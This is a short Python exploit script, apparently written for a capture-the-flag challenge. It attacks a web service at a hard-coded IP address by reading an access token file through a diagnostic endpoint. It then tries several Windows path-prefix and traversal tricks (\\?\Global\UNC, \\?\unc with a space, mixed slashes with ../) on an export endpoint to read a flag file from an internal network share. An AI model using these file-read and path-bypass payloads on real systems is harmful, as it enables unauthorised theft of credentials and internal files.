import requests
import time

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except:
        pass
    return None

def check(path, tok=None):
    if not tok: tok = get_token()
    if not tok: return
    try:
        r = requests.get(f"{BASE_URL}/api/export/read", params={"path": path, "token": tok}, timeout=5)
        print(f"Path: {path} -> {r.status_code}")
        print(f"Resp: {r.text}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Confirm baseline
    check(r"\\?\C:\token\access_key.txt")
    
    # Check Global UNC behavior
    check(r"\\?\Global\UNC\172.20.0.10\backup\flag.txt")
    
    # Check UNC space behavior
    check(r"\\?\unc \172.20.0.10\backup\flag.txt")
    
    # Check C: mapped to Mup?
    check(r"\\?\C:\172.20.0.10\backup\flag.txt")
    
    # Check Local
    check(r"\\?\Local\UNC\172.20.0.10\backup\flag.txt")

    # Check mixed slashes
    check(r"\\?\C:\/../Global/UNC/172.20.0.10/backup/flag.txt")
